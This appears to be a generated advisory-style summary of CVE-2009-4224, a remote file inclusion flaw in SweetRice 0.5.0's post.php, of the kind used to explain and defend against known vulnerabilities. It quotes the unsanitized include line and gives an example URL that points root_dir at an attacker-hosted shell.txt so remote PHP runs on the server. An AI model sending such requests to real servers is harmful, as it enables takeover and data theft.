The provided content from exploit-db.com and secunia.com relates to CVE-2009-4224.

**Root cause of vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) flaw found in the `post.php` script of SweetRice version 0.5.0 and possibly earlier versions.

**Weaknesses/vulnerabilities present:**
The `post.php` script includes an external file using a variable `root_dir` without proper sanitization. This allows an attacker to control the included file path through the `root_dir` GET parameter, leading to RFI.

**Impact of exploitation:**
An attacker can include and execute arbitrary code on the server by injecting a malicious URL through the `root_dir` parameter. This can lead to complete server compromise, data theft, or other malicious activities.

**Attack vectors:**
The attack vector is through a specially crafted URL that passes a malicious file path to the `root_dir` parameter of the vulnerable `post.php` script.

**Required attacker capabilities/position:**
The attacker needs to be able to send HTTP requests to the vulnerable server and have a server to host the malicious file/script.

**More Details:**

*   The vulnerable code is located in `sweetrice/_plugin/subscriber/inc/post.php` at line 2: `include_once($root_dir."_plugin/fckeditor/fckeditor.php") ;`
*   The attacker injects the malicious URL through the `root_dir` GET parameter, for example: `http://server/_plugin/subscriber/inc/post.php?root_dir=http://[attacker]/shell.txt???`. The `shell.txt` will be included and executed as php file if it contains php code.
